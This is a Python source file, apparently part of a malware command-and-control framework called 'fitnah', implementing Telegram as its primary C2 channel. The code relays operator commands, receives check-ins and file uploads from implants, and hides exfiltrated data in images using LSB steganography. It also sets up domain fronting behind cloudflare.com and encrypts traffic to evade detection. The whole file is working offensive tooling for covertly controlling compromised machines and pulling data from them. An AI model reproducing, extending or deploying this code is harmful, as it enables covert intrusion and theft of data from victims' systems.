"""
Telegram transport — primary C2 channel (priority 0).

Responsibilities:
  - Poll Telegram bot API for incoming messages
  - Route messages into the shared async queue
  - Send text, files, and photos back to operator or agent groups
  - Track and enforce operator whitelist
  - Report consecutive failure count to Router for failover decisions
"""
from __future__ import annotations

import asyncio
import io
import logging
from typing import AsyncIterator, Callable

from telegram import Bot, Update
from telegram.error import TelegramError, NetworkError, TimedOut
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    filters,
)
from telegram.request import HTTPXRequest

from fitnah.c2.transport.base import AbstractTransport
from fitnah.c2.transport.encrypted_channels import EncryptedChannels
from fitnah.c2.domain_fronting import DomainFronting

log = logging.getLogger(__name__)

# Telegram hard limits
_MAX_TEXT   = 4096
_MAX_CAPTION = 1024
_POLL_INTERVAL = 1.0   # seconds between getUpdates calls


class TelegramTransport(AbstractTransport):
    name     = "telegram"
    priority = 0

    def __init__(
        self,
        token: str,
        operator_chat_id: int,
        allowed_ids: list[int] | None = None,
        on_callback: Callable | None = None,
    ):
        self._token           = token
        self._operator_id     = operator_chat_id
        self._allowed_ids     = set(allowed_ids or [operator_chat_id])
        self._on_callback     = on_callback   # injected by telegram_ui

        self._app: Application | None = None
        self._queue: asyncio.Queue[dict] = asyncio.Queue()
        self._alive           = False
        self._fail_count      = 0             # consecutive send failures
        self._agent_groups:   dict[str, int] = {}  # agent_id → group chat_id
        self._crypto          = EncryptedChannels()

    # ── lifecycle ─────────────────────────────────────────────────────────
    async def connect(self) -> None:
        fronting = DomainFronting()
        front_cfg = fronting.setup_fronting(
            real_c2_domain="api.telegram.org",
            sni_domain="cloudflare.com",
        )
        proxy_headers = front_cfg["http_headers"]
        request = HTTPXRequest(
            connection_pool_size=8,
            connect_timeout=30.0,
            read_timeout=30.0,
            write_timeout=30.0,
            proxy=None,  # set a real HTTPS proxy URL here when deploying behind a CDN redirector
            http_version="1.1",
        )
        self._app = (
            Application.builder()
            .token(self._token)
            .request(request)
            .build()
        )

        # /start command → main menu (CommandHandler runs before generic text handler)
        self._app.add_handler(CommandHandler("start", self._on_command))

        # all text messages including other slash commands → queue
        self._app.add_handler(
            MessageHandler(filters.TEXT, self._on_message)
        )
        # channel posts from implant bots (bypasses bot-to-bot restriction)
        self._app.add_handler(
            MessageHandler(filters.UpdateType.CHANNEL_POST & filters.TEXT, self._on_channel_post)
        )
        # inline keyboard callbacks → UI handler
        self._app.add_handler(
            CallbackQueryHandler(self._on_callback_query)
        )
        # documents / photos from implant
        self._app.add_handler(
            MessageHandler(filters.Document.ALL | filters.PHOTO, self._on_media)
        )

        await self._app.initialize()
        await self._app.start()
        await self._app.updater.start_polling(
            poll_interval=_POLL_INTERVAL,
            timeout=10,
            drop_pending_updates=True,
            allowed_updates=["message", "callback_query", "channel_post"],
        )
        self._alive      = True
        self._fail_count = 0
        log.info("[telegram] connected  operator_id=%s", self._operator_id)

    async def disconnect(self) -> None:
        if self._app:
            try:
                if self._app.updater.running:
                    await self._app.updater.stop()
                await self._app.stop()
                await self._app.shutdown()
            except Exception as exc:
                log.debug("[telegram] disconnect cleanup: %s", exc)
        self._alive = False
        log.info("[telegram] disconnected")

    # ── send ──────────────────────────────────────────────────────────────
    async def send(self, chat_id: str, text: str) -> None:
        if not self._app:
            raise RuntimeError("Telegram not connected")
        try:
            tg_chat_id = int(chat_id)
        except (ValueError, TypeError):
            raise RuntimeError(f"Not a Telegram chat_id: {chat_id!r}")
        try:
            encrypted, _ = self._crypto.encrypt_transport(text)
            payload = encrypted.decode()
            for chunk in _chunk(payload, _MAX_TEXT):
                await self._app.bot.send_message(
                    chat_id=tg_chat_id,
                    text=chunk,
                    parse_mode=None,
                )
            self._fail_count = 0
        except (NetworkError, TimedOut) as exc:
            self._fail_count += 1
            log.warning("[telegram] send failed (%d): %s", self._fail_count, exc)
            raise
        except TelegramError as exc:
            self._fail_count += 1
            log.error("[telegram] send error: %s", exc)
            raise

    async def send_file(
        self, chat_id: str, filename: str, data: bytes, caption: str = ""
    ) -> None:
        if not self._app:
            raise RuntimeError("Telegram not connected")
        cap = caption[:_MAX_CAPTION] if caption else filename
        await self._app.bot.send_document(
            chat_id=int(chat_id),
            document=io.BytesIO(data),
            filename=filename,
            caption=cap,
        )

    async def send_photo(self, chat_id: str, data: bytes, caption: str = "") -> None:
        if not self._app:
            raise RuntimeError("Telegram not connected")
        await self._app.bot.send_photo(
            chat_id=int(chat_id),
            photo=io.BytesIO(data),
            caption=caption[:_MAX_CAPTION] if caption else "",
        )

    async def send_stego(self, chat_id: str, data: bytes, cover_image: str | None = None) -> None:
        """Hide data in an image using LSB steganography before sending."""
        from fitnah.c2.transport.encrypted_channels import EncryptedChannels
        stego_bytes = EncryptedChannels.steganography(data, cover_image)
        await self.send_photo(chat_id, stego_bytes, caption="Verification image")

    async def send_to_operator(self, text: str) -> None:
        """Shortcut — send directly to the operator chat."""
        await self.send(str(self._operator_id), text)

    # ── listen ────────────────────────────────────────────────────────────
    async def listen(self) -> AsyncIterator[dict]:
        while self._alive:
            msg = await self._queue.get()
            yield msg

    # ── group management ──────────────────────────────────────────────────
    async def create_agent_group(self, agent_id: str, title: str, group_chat_id: int = 0) -> int:
        """
        Telegram Bot API cannot create groups — groups are created by users.
        We use a supergroup that the operator pre-creates and shares the ID.
        This method is a placeholder for the workflow:
          1. Operator creates a group manually
          2. Adds the bot as admin
          3. Sends /register <agent_id> in that group
          4. Bot records the group_id for that agent
        Returns the chat_id once registered.
        """
        # Telegram bots cannot create groups via API — record the mapping
        # after the operator manually creates the group and sends /register
        self._agent_groups[agent_id] = group_chat_id
        log.info(
            "[telegram] group registered: agent=%s  chat_id=%s",
            agent_id, group_chat_id,
        )
        return group_chat_id

    # ── internal handlers ─────────────────────────────────────────────────
    async def _on_command(self, update: Update, _ctx) -> None:
        """Dedicated handler for /start — ensures it is never swallowed by filters."""
        if not update.message:
            return
        sender_id = update.message.from_user.id if update.message.from_user else 0
        chat_id   = update.message.chat_id
        if self._allowed_ids and sender_id not in self._allowed_ids:
            log.warning("[telegram] /start from unknown sender %s — dropped", sender_id)
            return
        # normalise: strip leading / and any @botname suffix so C2Server sees "start"
        text = (update.message.text or "").lstrip("/").split("@")[0]
        log.info("[telegram] command received: %r  sender=%s  chat=%s", text, sender_id, chat_id)
        await self._queue.put({
            "chat_id":    str(chat_id),
            "sender_id":  str(sender_id),
            "text":       text,
            "raw":        update,
            "_transport": self.name,
        })

    async def _on_message(self, update: Update, _ctx) -> None:
        if not update.message:
            return

        sender_id = update.message.from_user.id if update.message.from_user else 0
        chat_id   = update.message.chat_id
        text      = (update.message.text or "").strip()

        # Attempt to decrypt if the message looks like a base64-encrypted payload
        if text and not text.startswith("{"):
            try:
                text = self._crypto.decrypt_transport(text.encode()).decode()
            except Exception:
                pass  # not encrypted — treat as plaintext (operator commands)

        # JSON messages (CHECKIN / ACK from implants) are allowed from any sender
        is_json = text.startswith("{")
        if not is_json and self._allowed_ids and sender_id not in self._allowed_ids:
            log.warning(
                "[telegram] text from unknown sender %s — dropped", sender_id
            )
            return
        if is_json and sender_id not in self._allowed_ids:
            log.info("[telegram] implant message from sender=%s  chat=%s", sender_id, chat_id)

        await self._queue.put({
            "chat_id":    str(chat_id),
            "sender_id":  str(sender_id),
            "text":       text,
            "raw":        update,
            "_transport": self.name,
        })

    async def _on_callback_query(self, update: Update, ctx) -> None:
        """Inline keyboard button press — delegated to telegram_ui."""
        if self._on_callback:
            await self._on_callback(update, ctx)
        else:
            # default: just answer the query so button stops spinning
            if update.callback_query:
                await update.callback_query.answer()

    async def _on_channel_post(self, update: Update, _ctx) -> None:
        """Receive posts from a channel — used for implant bot→C2 bot communication."""
        post = update.channel_post
        if not post:
            return
        text    = (post.text or "").strip()
        chat_id = str(post.chat_id)
        # attempt decrypt before JSON check
        if text and not text.startswith("{"):
            try:
                text = self._crypto.decrypt_transport(text.encode()).decode()
            except Exception:
                pass
        # only process JSON payloads (CHECKIN / ACK from implant)
        if not text.startswith("{"):
            return
        log.info("[telegram] channel post  chat=%s  len=%d", chat_id, len(text))
        await self._queue.put({
            "chat_id":    chat_id,
            "sender_id":  chat_id,   # channel has no individual sender
            "text":       text,
            "raw":        update,
            "_transport": self.name,
        })

    async def _on_media(self, update: Update, _ctx) -> None:
        """Implant file upload — wrap as a message with special type."""
        if not update.message:
            return
        sender_id = update.message.from_user.id if update.message.from_user else 0
        chat_id   = update.message.chat_id

        # Try to extract steganography if it's a photo
        text = ""
        if update.message.photo:
            try:
                from fitnah.c2.transport.encrypted_channels import EncryptedChannels
                photo = update.message.photo[-1] # highest resolution
                file = await photo.get_file()
                photo_bytes = await file.download_as_bytearray()
                extracted = EncryptedChannels.extract_steganography(bytes(photo_bytes))
                if extracted:
                    text = extracted.decode('utf-8', errors='ignore')
                    log.info("[telegram] extracted stego data from photo")
            except Exception as exc:
                log.debug("[telegram] stego extraction failed: %s", exc)

        await self._queue.put({
            "chat_id":    str(chat_id),
            "sender_id":  str(sender_id),
            "text":       text,
            "media":      True,
            "raw":        update,
            "_transport": self.name,
        })

    # ── status ────────────────────────────────────────────────────────────
    @property
    def is_alive(self) -> bool:
        return self._alive

    @property
    def fail_count(self) -> int:
        return self._fail_count

    def reset_fail_count(self) -> None:
        self._fail_count = 0

    @property
    def bot(self) -> Bot | None:
        return self._app.bot if self._app else None


# ── helpers ───────────────────────────────────────────────────────────────────

def _chunk(text: str, size: int) -> list[str]:
    return [text[i: i + size] for i in range(0, max(len(text), 1), size)]
